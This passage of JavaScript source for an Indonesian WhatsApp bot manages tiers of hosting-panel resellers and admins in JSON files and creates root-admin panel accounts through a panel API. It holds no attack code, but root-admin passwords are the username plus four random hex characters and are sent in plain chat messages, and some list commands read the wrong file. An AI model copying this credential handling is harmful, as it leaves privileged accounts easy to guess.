    let owners = JSON.parse(fs.readFileSync(filePath));

    const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const input2 = input.split("@")[0];

    if (input2 === global.owner || input === botNumber) return syahreply("⚠️ *Tidak dapat menghapus owner utama!*");
    if (!owners.includes(input)) return syahreply(`⚠️ *Nomor ${input2} bukan owner bot!*`);

    owners = owners.filter(owner => owner !== input);
    fs.writeFileSync(filePath, JSON.stringify(owners, null, 2));

    syahreply(`✅ *Berhasil menghapus SELLER ${input2}!*`);
}
break;
case "listseller": {
    const filePath = "./library/database/resseler.json";
    if (!fs.existsSync(filePath)) return syahreply("⚠️ *Belum ada SELLER tambahan!*");

    let owners = JSON.parse(fs.readFileSync(filePath));
    if (owners.length < 1) return syahreply("⚠️ *Belum ada SELLER tambahan!*");

    let teks = `\n*🔰 List SELLER Tambahan 🔰*\n`;
    for (let i of owners) {
        teks += `\n➤ *${i.split("@")[0]}* \n📌 *Tag:* @${i.split("@")[0]}\n`;
    }

    syah.sendMessage(m.chat, { text: teks, mentions: owners }, { quoted: qtext });
}
break;
case "addseller2": case "address2": {
    if (!isCreator && !isAdpbos && !isAdpbos2 && !isAdpbos3 && !isAdpbos4 && !isAdpbos5) return syahreply(mess.owner);
    if (!m.quoted && !text) return syahreply(example("*6285xxx atau reply pesan pengguna!*"));

    const filePath = "./library/database/resseler2.json";
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify([])); // Jika file tidak ada, buat file kosong
    }

    let owners = JSON.parse(fs.readFileSync(filePath));
    const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const input2 = input.split("@")[0];

    if (input2 === global.owner || owners.includes(input) || input === botNumber) {
        return syahreply(`⚠️ *Nomor ${input2} sudah menjadi owner bot!*`);
    }

    owners.push(input);
    fs.writeFileSync(filePath, JSON.stringify(owners, null, 2));

    syahreply(`🚀 Selamat! Anda sekarang menjadi RESELLER PANEL!

✨ Keuntungan yang Anda dapatkan:
🔹 CREATE PANEL 1GBV2-UNLIV2
🔹 Mendapat hak istimewa sebagai RESELLER V2🚀

🔥 Gunakan kesempatan ini sebaik mungkin & selamat berbisnis!`
    );
}
break;
case "delseller2": case "delseller2": {
    if (!isCreator && !isAdpbos && !isAdpbos2 && !isAdpbos3 && !isAdpbos4 && !isAdpbos5) return syahreply(mess.owner);
    if (!m.quoted && !text) return syahreply(example("*6285xxx atau reply pesan owner!*"));

    const filePath = "./library/database/resseler2.json";
    if (!fs.existsSync(filePath)) return syahreply("⚠️ *Belum ada SELLER tambahan!*");

    let owners = JSON.parse(fs.readFileSync(filePath));

    const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const input2 = input.split("@")[0];

    if (input2 === global.owner || input === botNumber) return syahreply("⚠️ *Tidak dapat menghapus owner utama!*");
    if (!owners.includes(input)) return syahreply(`⚠️ *Nomor ${input2} bukan owner bot!*`);

    owners = owners.filter(owner => owner !== input);
    fs.writeFileSync(filePath, JSON.stringify(owners, null, 2));

    syahreply(`✅ *Berhasil menghapus SELLER 2${input2}!*`);
}
break;
case "listseller2": {
    const filePath = "./library/database/resseler2.json";
    if (!fs.existsSync(filePath)) return syahreply("⚠️ *Belum ada SELLER tambahan!*");

    let owners = JSON.parse(fs.readFileSync(filePath));
    if (owners.length < 1) return syahreply("⚠️ *Belum ada SELLER 2 tambahan!*");

    let teks = `\n*🔰 List SELLER Tambahan 🔰*\n`;
    for (let i of owners) {
        teks += `\n➤ *${i.split("@")[0]}* \n📌 *Tag:* @${i.split("@")[0]}\n`;
    }

    syah.sendMessage(m.chat, { text: teks, mentions: owners }, { quoted: qtext });
}
break;
case "addseller3": case "address3": {
    if (!isCreator && !isAdpbos && !isAdpbos2 && !isAdpbos3 && !isAdpbos4 && !isAdpbos5) return syahreply(mess.owner);
    if (!m.quoted && !text) return syahreply(example("*6285xxx atau reply pesan pengguna!*"));

    const filePath = "./library/database/resseler3.json";
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify([])); // Jika file tidak ada, buat file kosong
    }

    let owners = JSON.parse(fs.readFileSync(filePath));
    const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const input2 = input.split("@")[0];

    if (input2 === global.owner || owners.includes(input) || input === botNumber) {
        return syahreply(`⚠️ *Nomor ${input2} sudah menjadi owner bot!*`);
    }

    owners.push(input);
    fs.writeFileSync(filePath, JSON.stringify(owners, null, 2));

    syahreply(`🚀 Selamat! Anda sekarang menjadi RESELLER PANEL3 V3!

✨ Keuntungan yang Anda dapatkan:
🔹 CREATE PANEL 1GBV3-UNLIV3
🔹 Mendapat hak istimewa sebagai RESELLER V3🚀

🔥 Gunakan kesempatan ini sebaik mungkin & selamat berbisnis!`
    );
}
break;
case "delseller3": case "delseller3": {
    if (!isCreator && !isAdpbos && !isAdpbos2 && !isAdpbos3 && !isAdpbos4 && !isAdpbos5) return syahreply(mess.owner);
    if (!m.quoted && !text) return syahreply(example("*6285xxx atau reply pesan owner!*"));

    const filePath = "./library/database/resseler3.json";
    if (!fs.existsSync(filePath)) return syahreply("⚠️ *Belum ada SELLER tambahan!*");

    let owners = JSON.parse(fs.readFileSync(filePath));

    const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const input2 = input.split("@")[0];

    if (input2 === global.owner || input === botNumber) return syahreply("⚠️ *Tidak dapat menghapus owner utama!*");
    if (!owners.includes(input)) return syahreply(`⚠️ *Nomor ${input2} bukan owner bot!*`);

    owners = owners.filter(owner => owner !== input);
    fs.writeFileSync(filePath, JSON.stringify(owners, null, 2));

    syahreply(`✅ *Berhasil menghapus SELLER 3${input2}!*`);
}
break;
case "listseller3": {
    const filePath = "./library/database/resseler3.json";
    if (!fs.existsSync(filePath)) return syahreply("⚠️ *Belum ada SELLER 3 tambahan!*");

    let owners = JSON.parse(fs.readFileSync(filePath));
    if (owners.length < 1) return syahreply("⚠️ *Belum ada SELLER 3 tambahan!*");

    let teks = `\n*🔰 List SELLER 3 Tambahan 🔰*\n`;
    for (let i of owners) {
        teks += `\n➤ *${i.split("@")[0]}* \n📌 *Tag:* @${i.split("@")[0]}\n`;
    }

    syah.sendMessage(m.chat, { text: teks, mentions: owners }, { quoted: qtext });
}
break;
case "addseller4": case "address4": {
    if (!isCreator && !isAdpbos && !isAdpbos2 && !isAdpbos3 && !isAdpbos4 && !isAdpbos5) return syahreply(mess.owner);
    if (!m.quoted && !text) return syahreply(example("*6285xxx atau reply pesan pengguna!*"));

    const filePath = "./library/database/resseler4.json";
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify([])); // Jika file tidak ada, buat file kosong
    }

    let owners = JSON.parse(fs.readFileSync(filePath));
    const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const input2 = input.split("@")[0];

    if (input2 === global.owner || owners.includes(input) || input === botNumber) {
        return syahreply(`⚠️ *Nomor ${input2} sudah menjadi owner bot!*`);
    }

    owners.push(input);
    fs.writeFileSync(filePath, JSON.stringify(owners, null, 2));

    syahreply(`🚀 Selamat! Anda sekarang menjadi RESELLER PANEL V4!

✨ Keuntungan yang Anda dapatkan:
🔹 CREATE PANEL 1GBV4-UNLIV4
🔹 Mendapat hak istimewa sebagai RESELLER V4🚀

🔥 Gunakan kesempatan ini sebaik mungkin & selamat berbisnis!`
    );
}
break;
case "delseller4": case "delseller4": {
    if (!isCreator && !isAdpbos && !isAdpbos2 && !isAdpbos3 && !isAdpbos4 && !isAdpbos5) return syahreply(mess.owner);
    if (!m.quoted && !text) return syahreply(example("*6285xxx atau reply pesan owner!*"));

    const filePath = "./library/database/resseler4.json";
    if (!fs.existsSync(filePath)) return syahreply("⚠️ *Belum ada SELLER 4 tambahan!*");

    let owners = JSON.parse(fs.readFileSync(filePath));

    const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const input2 = input.split("@")[0];

    if (input2 === global.owner || input === botNumber) return syahreply("⚠️ *Tidak dapat menghapus owner utama!*");
    if (!owners.includes(input)) return syahreply(`⚠️ *Nomor ${input2} bukan owner bot!*`);

    owners = owners.filter(owner => owner !== input);
    fs.writeFileSync(filePath, JSON.stringify(owners, null, 2));

    syahreply(`✅ *Berhasil menghapus SELLER 4${input2}!*`);
}
break;
case "listseller4": {
    const filePath = "./library/database/resseler4.json";
    if (!fs.existsSync(filePath)) return syahreply("⚠️ *Belum ada SELLER 4 tambahan!*");

    let owners = JSON.parse(fs.readFileSync(filePath));
    if (owners.length < 1) return syahreply("⚠️ *Belum ada SELLER 4 tambahan!*");

    let teks = `\n*🔰 List SELLER Tambahan 🔰*\n`;
    for (let i of owners) {
        teks += `\n➤ *${i.split("@")[0]}* \n📌 *Tag:* @${i.split("@")[0]}\n`;
    }

    syah.sendMessage(m.chat, { text: teks, mentions: owners }, { quoted: qtext });
}
break;
case "addseller5": case "address5": {
    if (!isCreator && !isAdpbos && !isAdpbos2 && !isAdpbos3 && !isAdpbos4 && !isAdpbos5) return syahreply(mess.owner);
    if (!m.quoted && !text) return syahreply(example("*6285xxx atau reply pesan pengguna!*"));

    const filePath = "./library/database/resseler5.json";
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify([])); // Jika file tidak ada, buat file kosong
    }

    let owners = JSON.parse(fs.readFileSync(filePath));
    const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const input2 = input.split("@")[0];

    if (input2 === global.owner || owners.includes(input) || input === botNumber) {
        return syahreply(`⚠️ *Nomor ${input2} sudah menjadi owner bot!*`);
    }

    owners.push(input);
    fs.writeFileSync(filePath, JSON.stringify(owners, null, 2));

    syahreply(`🚀 Selamat! Anda sekarang menjadi RESELLER PANEL V5!

✨ Keuntungan yang Anda dapatkan:
🔹 CREATE PANEL 1GBV5-UNLIV5
🔹 Mendapat hak istimewa sebagai RESELLER V5🚀

🔥 Gunakan kesempatan ini sebaik mungkin & selamat berbisnis!`
    );
}
break;
case "delseller5": case "delseller5": {
    if (!isCreator && !isAdpbos && !isAdpbos2 && !isAdpbos3 && !isAdpbos4 && !isAdpbos5) return syahreply(mess.owner);
    if (!m.quoted && !text) return syahreply(example("*6285xxx atau reply pesan owner!*"));

    const filePath = "./library/database/resseler5.json";
    if (!fs.existsSync(filePath)) return syahreply("⚠️ *Belum ada SELLER 5 tambahan!*");

    let owners = JSON.parse(fs.readFileSync(filePath));

    const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const input2 = input.split("@")[0];

    if (input2 === global.owner || input === botNumber) return syahreply("⚠️ *Tidak dapat menghapus owner utama!*");
    if (!owners.includes(input)) return syahreply(`⚠️ *Nomor ${input2} bukan owner bot!*`);

    owners = owners.filter(owner => owner !== input);
    fs.writeFileSync(filePath, JSON.stringify(owners, null, 2));

    syahreply(`✅ *Berhasil menghapus SELLER 5${input2}!*`);
}
break;
case "listseller5": {
    const filePath = "./library/database/resseler5.json";
    if (!fs.existsSync(filePath)) return syahreply("⚠️ *Belum ada SELLER 5 tambahan!*");

    let owners = JSON.parse(fs.readFileSync(filePath));
    if (owners.length < 1) return syahreply("⚠️ *Belum ada SELLER 5 tambahan!*");

    let teks = `\n*🔰 List SELLER 5 Tambahan 🔰*\n`;
    for (let i of owners) {
        teks += `\n➤ *${i.split("@")[0]}* \n📌 *Tag:* @${i.split("@")[0]}\n`;
    }

    syah.sendMessage(m.chat, { text: teks, mentions: owners }, { quoted: qtext });
}
break;
case "addadp": case "addadp": {
    if (!isCreator && !isAdpbos2 && !isAdpbos3 && !isAdpbos4 && !isAdpbos5) return syahreply(mess.owner);
    if (!m.quoted && !text) return syahreply(example("*6285xxx atau reply pesan pengguna!*"));

    const filePath = "./library/database/adpbos.json";
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify([])); // Jika file tidak ada, buat file kosong
    }

    let owners = JSON.parse(fs.readFileSync(filePath));
    const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const input2 = input.split("@")[0];

    if (input2 === global.owner || owners.includes(input) || input === botNumber) {
        return syahreply(`⚠️ *Nomor ${input2} sudah menjadi owner bot!*`);
    }

    owners.push(input);
    fs.writeFileSync(filePath, JSON.stringify(owners, null, 2));

    syahreply(`🚀 Selamat! Anda sekarang menjadi ADP PANEL!

✨ Keuntungan yang Anda dapatkan:
🔹 CREATE PANEL 1GB-UNLI DAN ADP
🔹 Mendapat hak istimewa sebagai ADMIN PANEL🚀

🔥 Gunakan kesempatan ini sebaik mungkin & selamat berbisnis!`
    );
}
break;
case "deladp": case "deladp": {
    if (!isCreator && !isAdpbos2 && !isAdpbos3 && !isAdpbos4 && !isAdpbos5) return syahreply(mess.owner);
    if (!m.quoted && !text) return syahreply(example("*6285xxx atau reply pesan owner!*"));

    const filePath = "./library/database/adpbos.json";
    if (!fs.existsSync(filePath)) return syahreply("⚠️ *Belum ada SELLER tambahan!*");

    let owners = JSON.parse(fs.readFileSync(filePath));

    const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const input2 = input.split("@")[0];

    if (input2 === global.owner || input === botNumber) return syahreply("⚠️ *Tidak dapat menghapus owner utama!*");
    if (!owners.includes(input)) return syahreply(`⚠️ *Nomor ${input2} bukan owner bot!*`);

    owners = owners.filter(owner => owner !== input);
    fs.writeFileSync(filePath, JSON.stringify(owners, null, 2));

    syahreply(`✅ *Berhasil menghapus SELLER ${input2}!*`);
}
break;
case "listadp": {
    const filePath = "./library/database/adpbos.json";
    if (!fs.existsSync(filePath)) return syahreply("⚠️ *Belum ada adp tambahan!*");

    let owners = JSON.parse(fs.readFileSync(filePath));
    if (owners.length < 1) return syahreply("⚠️ *Belum ada adp tambahan!*");

    let teks = `\n*🔰 List adp Tambahan 🔰*\n`;
    for (let i of owners) {
        teks += `\n➤ *${i.split("@")[0]}* \n📌 *Tag:* @${i.split("@")[0]}\n`;
    }

    syah.sendMessage(m.chat, { text: teks, mentions: owners }, { quoted: qtext });
}
break;
case "addadp2": case "addadp2": {
    if (!isCreator && !isAdpbos3 && !isAdpbos4 && !isAdpbos5) return syahreply(mess.owner);
    if (!m.quoted && !text) return syahreply(example("*6285xxx atau reply pesan pengguna!*"));

    const filePath = "./library/database/adpbos2.json";
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify([])); // Jika file tidak ada, buat file kosong
    }

    let owners = JSON.parse(fs.readFileSync(filePath));
    const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const input2 = input.split("@")[0];

    if (input2 === global.owner || owners.includes(input) || input === botNumber) {
        return syahreply(`⚠️ *Nomor ${input2} sudah menjadi owner bot!*`);
    }

    owners.push(input);
    fs.writeFileSync(filePath, JSON.stringify(owners, null, 2));

    syahreply(`🚀 Selamat! Anda sekarang menjadi ADP PANEL!

✨ Keuntungan yang Anda dapatkan:
🔹 CREATE PANEL 1GB-UNLI DAN ADP
🔹 Mendapat hak istimewa sebagai ADMIN PANEL🚀

🔥 Gunakan kesempatan ini sebaik mungkin & selamat berbisnis!`
    );
}
break;
case "deladp2": case "deladp2": {
    if (!isCreator && !isAdpbos3 && !isAdpbos4 && !isAdpbos5) return syahreply(mess.owner);
    if (!m.quoted && !text) return syahreply(example("*6285xxx atau reply pesan owner!*"));

    const filePath = "./library/database/adpbos2.json";
    if (!fs.existsSync(filePath)) return syahreply("⚠️ *Belum ada SELLER tambahan!*");

    let owners = JSON.parse(fs.readFileSync(filePath));

    const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const input2 = input.split("@")[0];

    if (input2 === global.owner || input === botNumber) return syahreply("⚠️ *Tidak dapat menghapus owner utama!*");
    if (!owners.includes(input)) return syahreply(`⚠️ *Nomor ${input2} bukan owner bot!*`);

    owners = owners.filter(owner => owner !== input);
    fs.writeFileSync(filePath, JSON.stringify(owners, null, 2));

    syahreply(`✅ *Berhasil menghapus ADP ${input2}!*`);
}
break;
case "listadp2": {
    const filePath = "./library/database/adpbos2.json";
    if (!fs.existsSync(filePath)) return syahreply("⚠️ *Belum ada adp tambahan!*");

    let owners = JSON.parse(fs.readFileSync(filePath));
    if (owners.length < 1) return syahreply("⚠️ *Belum ada adp tambahan!*");

    let teks = `\n*🔰 List adp Tambahan 🔰*\n`;
    for (let i of owners) {
        teks += `\n➤ *${i.split("@")[0]}* \n📌 *Tag:* @${i.split("@")[0]}\n`;
    }

    syah.sendMessage(m.chat, { text: teks, mentions: owners }, { quoted: qtext });
}
break;
case "addadp3": case "addadp3": {
    if (!isCreator && !isAdpbos4 && !isAdpbos5) return syahreply(mess.owner);
    if (!m.quoted && !text) return syahreply(example("*6285xxx atau reply pesan pengguna!*"));

    const filePath = "./library/database/adpbos3.json";
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify([])); // Jika file tidak ada, buat file kosong
    }

    let owners = JSON.parse(fs.readFileSync(filePath));
    const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const input2 = input.split("@")[0];

    if (input2 === global.owner || owners.includes(input) || input === botNumber) {
        return syahreply(`⚠️ *Nomor ${input2} sudah menjadi owner bot!*`);
    }

    owners.push(input);
    fs.writeFileSync(filePath, JSON.stringify(owners, null, 2));

    syahreply(`🚀 Selamat! Anda sekarang menjadi ADP PANEL!

✨ Keuntungan yang Anda dapatkan:
🔹 CREATE PANEL 1GB-UNLI DAN ADP
🔹 Mendapat hak istimewa sebagai ADMIN PANEL🚀

🔥 Gunakan kesempatan ini sebaik mungkin & selamat berbisnis!`
    );
}
break;
case "deladp3": case "deladp3": {
    if (!isCreator && !isAdpbos4 && !isAdpbos5) return syahreply(mess.owner);
    if (!m.quoted && !text) return syahreply(example("*6285xxx atau reply pesan owner!*"));

    const filePath = "./library/database/adpbos3.json";
    if (!fs.existsSync(filePath)) return syahreply("⚠️ *Belum ada SELLER tambahan!*");

    let owners = JSON.parse(fs.readFileSync(filePath));

    const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const input2 = input.split("@")[0];

    if (input2 === global.owner || input === botNumber) return syahreply("⚠️ *Tidak dapat menghapus owner utama!*");
    if (!owners.includes(input)) return syahreply(`⚠️ *Nomor ${input2} bukan owner bot!*`);

    owners = owners.filter(owner => owner !== input);
    fs.writeFileSync(filePath, JSON.stringify(owners, null, 2));

    syahreply(`✅ *Berhasil menghapus SELLER ${input2}!*`);
}
break;
case "listadp3": {
    const filePath = "./library/database/adpbos3.json";
    if (!fs.existsSync(filePath)) return syahreply("⚠️ *Belum ada adp tambahan!*");

    let owners = JSON.parse(fs.readFileSync(filePath));
    if (owners.length < 1) return syahreply("⚠️ *Belum ada adp tambahan!*");

    let teks = `\n*🔰 List adp Tambahan 🔰*\n`;
    for (let i of owners) {
        teks += `\n➤ *${i.split("@")[0]}* \n📌 *Tag:* @${i.split("@")[0]}\n`;
    }

    syah.sendMessage(m.chat, { text: teks, mentions: owners }, { quoted: qtext });
}
break;
case "addadp4": case "addadp4": {
    if (!isCreator && !isAdpbos5) return syahreply(mess.owner);
    if (!m.quoted && !text) return syahreply(example("*6285xxx atau reply pesan pengguna!*"));

    const filePath = "./library/database/adpbos4.json";
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify([])); // Jika file tidak ada, buat file kosong
    }

    let owners = JSON.parse(fs.readFileSync(filePath));
    const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const input2 = input.split("@")[0];

    if (input2 === global.owner || owners.includes(input) || input === botNumber) {
        return syahreply(`⚠️ *Nomor ${input2} sudah menjadi owner bot!*`);
    }

    owners.push(input);
    fs.writeFileSync(filePath, JSON.stringify(owners, null, 2));

    syahreply(`🚀 Selamat! Anda sekarang menjadi ADP PANEL!

✨ Keuntungan yang Anda dapatkan:
🔹 CREATE PANEL 1GB-UNLI DAN ADP
🔹 Mendapat hak istimewa sebagai ADMIN PANEL🚀

🔥 Gunakan kesempatan ini sebaik mungkin & selamat berbisnis!`
    );
}
break;
case "deladp4": case "deladp4": {
    if (!isCreator && !isAdpbos5) return syahreply(mess.owner);
    if (!m.quoted && !text) return syahreply(example("*6285xxx atau reply pesan owner!*"));

    const filePath = "./library/database/adpbos4.json";
    if (!fs.existsSync(filePath)) return syahreply("⚠️ *Belum ada SELLER tambahan!*");

    let owners = JSON.parse(fs.readFileSync(filePath));

    const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const input2 = input.split("@")[0];

    if (input2 === global.owner || input === botNumber) return syahreply("⚠️ *Tidak dapat menghapus owner utama!*");
    if (!owners.includes(input)) return syahreply(`⚠️ *Nomor ${input2} bukan owner bot!*`);

    owners = owners.filter(owner => owner !== input);
    fs.writeFileSync(filePath, JSON.stringify(owners, null, 2));

    syahreply(`✅ *Berhasil menghapus SELLER ${input2}!*`);
}
break;
case "listadp4": {
    const filePath = "./library/database/adpbos4.json";
    if (!fs.existsSync(filePath)) return syahreply("⚠️ *Belum ada adp tambahan!*");

    let owners = JSON.parse(fs.readFileSync(filePath));
    if (owners.length < 1) return syahreply("⚠️ *Belum ada adp tambahan!*");

    let teks = `\n*🔰 List adp Tambahan 🔰*\n`;
    for (let i of owners) {
        teks += `\n➤ *${i.split("@")[0]}* \n📌 *Tag:* @${i.split("@")[0]}\n`;
    }

    syah.sendMessage(m.chat, { text: teks, mentions: owners }, { quoted: qtext });
}
break;
case "addadp5": case "addadp5": {
    if (!isCreator) return syahreply(mess.owner);
    if (!m.quoted && !text) return syahreply(example("*6285xxx atau reply pesan pengguna!*"));

    const filePath = "./library/database/adpbos5.json";
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify([])); // Jika file tidak ada, buat file kosong
    }

    let owners = JSON.parse(fs.readFileSync(filePath));
    const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const input2 = input.split("@")[0];

    if (input2 === global.owner || owners.includes(input) || input === botNumber) {
        return syahreply(`⚠️ *Nomor ${input2} sudah menjadi owner bot!*`);
    }

    owners.push(input);
    fs.writeFileSync(filePath, JSON.stringify(owners, null, 2));

    syahreply(`🚀 Selamat! Anda sekarang menjadi ADP PANEL!

✨ Keuntungan yang Anda dapatkan:
🔹 CREATE PANEL 1GB-UNLI DAN ADP
🔹 Mendapat hak istimewa sebagai ADMIN PANEL🚀

🔥 Gunakan kesempatan ini sebaik mungkin & selamat berbisnis!`
    );
}
break;
case "deladp5": case "deladp5": {
    if (!isCreator) return syahreply(mess.owner);
    if (!m.quoted && !text) return syahreply(example("*6285xxx atau reply pesan owner!*"));

    const filePath = "./library/database/adpbos5.json";
    if (!fs.existsSync(filePath)) return syahreply("⚠️ *Belum ada SELLER tambahan!*");

    let owners = JSON.parse(fs.readFileSync(filePath));

    const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const input2 = input.split("@")[0];

    if (input2 === global.owner || input === botNumber) return syahreply("⚠️ *Tidak dapat menghapus owner utama!*");
    if (!owners.includes(input)) return syahreply(`⚠️ *Nomor ${input2} bukan owner bot!*`);

    owners = owners.filter(owner => owner !== input);
    fs.writeFileSync(filePath, JSON.stringify(owners, null, 2));

    syahreply(`✅ *Berhasil menghapus SELLER ${input2}!*`);
}
break;
case "listadp5": {
    const filePath = "./library/database/adpbos.json";
    if (!fs.existsSync(filePath)) return syahreply("⚠️ *Belum ada adp tambahan!*");

    let owners = JSON.parse(fs.readFileSync(filePath));
    if (owners.length < 1) return syahreply("⚠️ *Belum ada adp tambahan!*");

    let teks = `\n*🔰 List adp Tambahan 🔰*\n`;
    for (let i of owners) {
        teks += `\n➤ *${i.split("@")[0]}* \n📌 *Tag:* @${i.split("@")[0]}\n`;
    }

    syah.sendMessage(m.chat, { text: teks, mentions: owners }, { quoted: qtext });
}
break;
case "cadmin": {
if (!isCreator && !isAdpbos && !isAdpbos2 && !isAdpbos3 && !isAdpbos4 && !isAdpbos5) return m.reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
  🚚 *PERMISI, PESANAN ADP ANDA TELAH SAMPAI!* 📦  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

✅ *Berhasil Membuat Admin Panel* ✅

📌 *Detail Akun Panel Anda:*  
───────────────────────────────  
🆔 *ID User:* ${user.id}  
📛 *Nama:* ${user.first_name}  
👤 *Username:* ${user.username}  
🔑 *Password:* ${password.toString()}  
🌐 *Login URL:* ${global.domain}  
───────────────────────────────  

❏▭▬▭▬▭▬▭▬▭▬▭▬▭▬  
⏳ *Masa Aktif:* 30 HARI  
📆 *Garansi:* 10 HARI  
❏▭▬▭▬▭▬▭▬▭▬▭▬▭▬  

⚠️ *Rules Admin Panel* ⚠️  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
1️⃣ Dilarang intip panel orang.  
2️⃣ Dilarang otak-atik panel.  
3️⃣ Dilarang ganti nama panel.  
4️⃣ Dilarang ambil script orang.  
5️⃣ Dilarang create admin panel tanpa izin.  
6️⃣ Dilarang otak-atik Node.js.  
7️⃣ Dilarang melakukan perubahan sembarangan.  

📢 *Penting:*  
*Claim garansi wajib membawa bukti screenshot chat saat pembelian.*  
‼️ Jangan nekat jika tidak paham! Pastikan melihat tutorial di YouTube.  
🛑 Jika ada kesalahan fatal, akun Anda dapat dihapus, *no refund & no comment*!  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📌 *Catatan Penting:*  
❗ *Owner hanya mengirimkan data akun sekali.*  
💾 *Mohon simpan data akun Anda dengan baik.*  
⛔ Jika hilang, owner tidak dapat mengirim ulang data Anda.  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
            *SYAH HOSTING*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
await syah.sendMessage(orang, {text: teks}, {quoted: m})
}
break
case "cadminv2": {
if (!isCreator && !isAdpbos2 && !isAdpbos3 && !isAdpbos4 && !isAdpbos5) return m.reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
  🚚 *PERMISI, PESANAN ADP ANDA TELAH SAMPAI!* 📦  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

✅ *Berhasil Membuat Admin Panel* ✅

📌 *Detail Akun Panel Anda:*  
───────────────────────────────  
🆔 *ID User:* ${user.id}  
📛 *Nama:* ${user.first_name}  
👤 *Username:* ${user.username}  
🔑 *Password:* ${password.toString()}  
🌐 *Login URL:* ${global.domain2}  
───────────────────────────────  

❏▭▬▭▬▭▬▭▬▭▬▭▬▭▬  
⏳ *Masa Aktif:* 30 HARI  
📆 *Garansi:* 10 HARI  
❏▭▬▭▬▭▬▭▬▭▬▭▬▭▬  

⚠️ *Rules Admin Panel* ⚠️  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
1️⃣ Dilarang intip panel orang.  
2️⃣ Dilarang otak-atik panel.  
3️⃣ Dilarang ganti nama panel.  
4️⃣ Dilarang ambil script orang.  
5️⃣ Dilarang create admin panel tanpa izin.  
6️⃣ Dilarang otak-atik Node.js.  
7️⃣ Dilarang melakukan perubahan sembarangan.  

📢 *Penting:*  
*Claim garansi wajib membawa bukti screenshot chat saat pembelian.*  
‼️ Jangan nekat jika tidak paham! Pastikan melihat tutorial di YouTube.  
🛑 Jika ada kesalahan fatal, akun Anda dapat dihapus, *no refund & no comment*!  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📌 *Catatan Penting:*  
❗ *Owner hanya mengirimkan data akun sekali.*  
💾 *Mohon simpan data akun Anda dengan baik.*  
⛔ Jika hilang, owner tidak dapat mengirim ulang data Anda.  

